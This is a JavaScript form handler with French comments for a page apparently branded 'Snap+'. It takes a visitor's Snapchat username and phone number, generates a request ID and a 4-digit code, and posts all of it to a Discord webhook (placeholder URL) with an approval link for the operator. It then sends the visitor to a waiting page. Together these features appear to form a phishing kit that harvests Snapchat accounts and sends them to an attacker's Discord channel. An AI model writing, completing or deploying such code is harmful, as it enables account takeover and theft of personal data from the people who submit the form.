document.addEventListener('DOMContentLoaded', () => {
  const form = document.getElementById('snapForm');
  if (form) {
    form.addEventListener('submit', async (e) => {
      // Empêche le rechargement de la page
      e.preventDefault();

      // Récupère les valeurs du formulaire
      const username = document.getElementById('username').value;
      const phone = document.getElementById('phone').value;

      // --- GÉNÉRATION DES DONNÉES ---
      // Génère un ID unique pour cette demande
      const requestId = 'req_' + Date.now();
      // Génère un code OTP à 4 chiffres
      const otpCode = Math.floor(1000 + Math.random() * 9000).toString();

      // --- PRÉPARATION DU MESSAGE DISCORD ---
      // Mets ton véritable URL de webhook Discord ici
      const webhookUrl = 'https://discord.com/api/webhooks/TON_WEBHOOK_ICI'; 

      // IMPORTANT : Remplace 'TON_DOMAINE' par l'adresse où tu testes ton site.
      // Si tu utilises http-server en local, ce sera probablement http://localhost:8080
      const validationLink = `http://TON_DOMAINE/validate.html?id=${requestId}`;

      const payload = {
        content: `📩 **Nouvelle demande Snap+**`,
        embeds: [{
          title: 'Action requise',
          description: `Cliquez sur le lien ci-dessous pour **Accepter** et continuer le processus.`,
          color: 15105570, // Orange
          fields: [
            { name: 'Nom d\'utilisateur Snap', value: username, inline: true },
            { name: 'Numéro de téléphone', value: phone, inline: true },
            { name: 'Code OTP à 4 chiffres', value: `**${otpCode}**`, inline: false },
            { name: 'Lien de validation', value: `[Accepter la demande](${validationLink})`, inline: false }
          ],
          footer: { text: `ID de la demande: ${requestId}` }
        }]
        // La section 'components' a été supprimée car elle ne fonctionne pas avec les webhooks
      };

      try {
        const response = await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });

        if (!response.ok) {
          throw new Error(`Erreur HTTP! statut: ${response.status}`);
        }

        console.log('Données envoyées à Discord avec succès !');
        
        // Stocke les données pour les pages suivantes
        sessionStorage.setItem('snapRequestId', requestId);
        sessionStorage.setItem('snapOtpCode', otpCode);

        // Redirige vers la page d'attente
        window.location.href = 'waiting.html';

      } catch (error) {
        console.error('Impossible d\'envoyer le message à Discord:', error);
        alert('Une erreur est survenue lors de l\'envoi. Vérifie la console (F12) pour plus de détails.');
      }
    });
  }
});